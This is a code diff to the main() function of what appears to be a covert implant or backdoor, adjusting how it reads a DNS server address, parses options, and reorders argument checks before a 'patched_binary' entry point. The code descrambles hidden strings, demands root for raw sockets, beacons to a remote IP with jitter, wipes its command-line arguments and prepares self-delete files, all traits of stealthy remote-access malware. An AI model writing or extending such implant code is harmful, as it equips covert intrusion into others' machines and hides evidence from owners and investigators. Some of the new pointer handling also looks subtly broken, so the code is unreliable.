@@ -122,7 +122,7 @@ int main(int argc, char** argv)
 {
 	int				c = 0;
 	char			*beaconIP = NULL;
-	char			dns_ip[16] = {0};
+	char			*dnsIP = NULL;
 	uint32_t		beaconIPaddr;
 	char			*szInterface = NULL;
 	int				beaconPort = DEFAULT_BEACON_PORT;
@@ -139,23 +139,19 @@ int main(int argc, char** argv)
 	int				status = 0;
 #endif
 
-
  	ikey[0] = '\0';
-
 	init_strings(); 	// De-scramble strings
 
 	// Check to see if we have sufficient root/admin permissions to continue.
 	// root/admin permissions required for RAW sockets and [on windows] discovering
 	// MAC address of ethernet interface(s)
-	if ( is_elevated_permissions() != SUCCESS )
-	{
+	if ( is_elevated_permissions() != SUCCESS ) {
 		fprintf(stderr,"%s", inp183Aq );
 		return -1;
 	}
 
 	//initialize srand only once using the initSrandFlag...
-    if (!initSrandFlag)
-    {
+    if (!initSrandFlag) {
         srand((unsigned int)time(NULL));
         initSrandFlag = 1;
     }
@@ -181,6 +177,7 @@ int main(int argc, char** argv)
 		szInterface = args.iface;
 		initialDelay = args.init_delay;
 		interval = args.interval;
+		dnsIP = args.dns_ip;
 		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
 		trigger_delay = args.trigger_delay;
 		delete_delay = args.delete_delay;
@@ -197,8 +194,8 @@ int main(int argc, char** argv)
 		cl_string((unsigned char *)sdpath, sizeof(sdpath));
 		DLX(1, printf( "\tDecoded sdpath: %s\n", sdpath));
 		strncpy(sdcfp, sdpath, strlen(sdpath));
-		cl_string((unsigned char *)dns_ip, sizeof(dns_ip));
-		DLX(1, printf( "\tDecoded DNS server address: %s\n", dns_ip));
+		cl_string((unsigned char *)dnsIP, sizeof(args.dns_ip));
+		DLX(1, printf( "\tDecoded DNS server address: %s\n", dnsIP));
 
 		goto patched_binary;
 	}
@@ -242,12 +239,10 @@ int main(int argc, char** argv)
 				break;
 
 			case 'j':
-				if ( ( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 ) )
-				{
+				if (( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 )) {
 					jitter = atoi(optarg) * 0.01f;
 				}
-				else
-				{
+				else {
 					jitter=-1;
 				}
 				break;
@@ -325,7 +320,7 @@ int main(int argc, char** argv)
 					fprintf(stderr, "%s\n", oe4);
 					return -1;
 				}
-				strncpy(dns_ip, address, sizeof(dns_ip));
+				strncpy(dnsIP, address, MIN(strlen(address), sizeof(args.dns_ip)));
 				break;
 				}
 
@@ -352,14 +347,23 @@ int main(int argc, char** argv)
 	if (initialDelay > 0 && interval == 0 ) {
 		DLX(1, printf("No Beacon Interval specified!\n"));
 		DLX(1, printUsage(argv[0]));
-		return 0;
+		return -1;
+	}
+	if  (initialDelay >= (INT_MAX-1)) {
+		DLX(1, printUsage(argv[0]));
+		return -1;
 	}
 
-	//Make sure the beacon's port is specified
-	if  (initialDelay >= (INT_MAX-1)) {
+	if (ikey[0] == '\0') {
 		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
+
+	clean_args(argc, argv, NULL);	// Zero command line arguments
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+patched_binary:	// Parsing of command line arguments skipped for patched binaries
 
 	if (initialDelay > 0) {			// Beacons enabled
 		char	*resolved_beaconIP = NULL;
@@ -373,15 +377,17 @@ int main(int argc, char** argv)
 		if (beaconIP == NULL) {
 			DLX(1, printf("No Beacon IP address specified!\n"));
 			DLX(1, printUsage(argv[0]));
-			return 0;
+			return -1;
 		}
+
 		if (inet_pton(AF_INET, beaconIP, &beaconIPaddr) == 0) {		// Determine if beacon IP is an address
-			if (dns_ip == NULL) {									// If not, attempt DNS lookup if DNS server was specified
+			if (dnsIP == NULL) {									// If not, attempt DNS lookup if DNS server was specified
 				DLX(1, printf("Beacon IP was specified as a domain name, but no DNS server was specified to resolve the name!\n"));
 				return -1;
 			}
-			while ((resolved_beaconIP = dns_resolv(beaconIP, dns_ip)) == NULL) {		// DNS lookup.
-				DLX(4, printf("Beacon IP address failed to resolve, sleeping for %i seconds.\n", interval/1000));
+
+			while ((resolved_beaconIP = dns_resolv(beaconIP, dnsIP)) == NULL) {		// DNS lookup.
+				DLX(1, printf("Beacon IP address failed to resolve, sleeping for %i seconds.\n", interval/1000));
 				sleep(interval/1000);											// If resolution fails, retry every beacon interval.
 			}
 			memcpy(beaconIP, resolved_beaconIP, strlen(resolved_beaconIP)+1);	// Copy the resolved IP address along with terminating NULL byte
@@ -389,23 +395,6 @@ int main(int argc, char** argv)
 			free(resolved_beaconIP);
 		}
 	}
-
-	//Make sure the jitter is non zero
-	if (jitter == -1) {
-		DLX(1, printUsage(argv[0]));
-		return 0;
-	}
-
-	if (ikey[0] == '\0') {
-		DLX(1, printUsage(argv[0]));
-		return 0;
-	}
-
-	clean_args(argc, argv, NULL);	// Zero command line arguments
-
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-patched_binary:	// Parsing of command line arguments skipped for patched binaries
 
 	// Construct self delete control and log files with full path names
 	if (strlen((const char *)sdcfp) == 0) {
